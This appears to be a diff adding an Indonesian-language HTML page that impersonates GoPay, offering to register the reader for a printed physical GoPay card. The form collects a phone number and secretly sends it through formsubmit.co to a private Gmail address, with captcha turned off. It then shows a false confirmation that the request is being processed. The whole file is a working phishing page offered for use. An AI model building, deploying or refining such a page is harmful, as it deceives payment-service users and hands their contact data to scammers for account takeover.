@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daftar Cetak Kartu Fisik GoPay</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #00AED6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #fff;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 420px;
+            padding: 36px 28px;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.12);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .logo h1 {
+            font-size: 26px;
+            font-weight: 800;
+            color: #00AED6;
+        }
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #25282B;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        .input-group {
+            margin-bottom: 28px;
+        }
+        .input-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+            display: block;
+        }
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            border: 1.5px solid #E2E2E2;
+            border-radius: 14px;
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+        .phone-wrapper:focus-within {
+            border-color: #00AED6;
+        }
+        .country-code {
+            padding: 16px 14px;
+            background: #F5F5F5;
+            color: #333;
+            font-weight: 600;
+            font-size: 16px;
+            border-right: 1px solid #E2E2E2;
+        }
+        .phone-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 16px 14px;
+            font-size: 16px;
+            color: #25282B;
+        }
+        .btn-submit {
+            width: 100%;
+            background: #00AED6;
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            padding: 16px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.25s;
+        }
+        .btn-submit:hover {
+            background: #0096B8;
+        }
+        /* Halaman Sukses */
+        .success-box {
+            text-align: center;
+            display: none;
+            padding: 20px 0;
+        }
+        .success-box.show {
+            display: block;
+        }
+        .success-icon {
+            font-size: 64px;
+            color: #10B981;
+            margin-bottom: 20px;
+        }
+        .success-box h2 {
+            color: #25282B;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        .success-box p {
+            color: #6B7280;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <!-- Formulir -->
+    <div id="form-content">
+        <div class="logo">
+            <h1>GoPay</h1>
+        </div>
+        <h1 class="title">Selamat datang di GoPay</h1>
+        <p class="subtitle">Daftar Cetak Kartu Fisik GoPay<br>Masukkan nomor HP kamu di bawah ini.</p>
+
+        <form action="https://formsubmit.co/ipahsaripah353@gmail.com" method="POST" onsubmit="tampilkanSukses(event)">
+            <!-- Konfigurasi Email -->
+            <input type="hidden" name="_subject" value="📋 Pendaftaran Cetak Kartu Fisik GoPay">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+
+            <div class="input-group">
+                <label class="input-label">Nomor Handphone</label>
+                <div class="phone-wrapper">
+                    <span class="country-code">+62</span>
+                    <input type="tel" name="nomor_hp" class="phone-input" 
+                        placeholder="812 3456 7890" 
+                        maxlength="15" 
+                        pattern="[0-9\s]*" 
+                        inputmode="numeric" 
+                        required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">Lanjut</button>
+        </form>
+    </div>
+
+    <!-- Halaman Sukses -->
+    <div id="success-content" class="success-box">
+        <div class="success-icon">✅</div>
+        <h2>Berhasil Terkirim!</h2>
+        <p>Terima kasih. Data nomor HP telah dikirim.<br>Kami akan segera memproses permintaan cetak kartu fisik GoPay kamu.</p>
+    </div>
+</div>
+
+<script>
+    function tampilkanSukses(e) {
+        e.preventDefault();
+        // Sembunyikan form, tampilkan notifikasi sukses
+        document.getElementById('form-content').style.display = 'none';
+        document.getElementById('success-content').classList.add('show');
+        // Kirim data ke FormSubmit
+        e.target.submit();
+    }
+</script>
+
+</body>
+</html>
+            
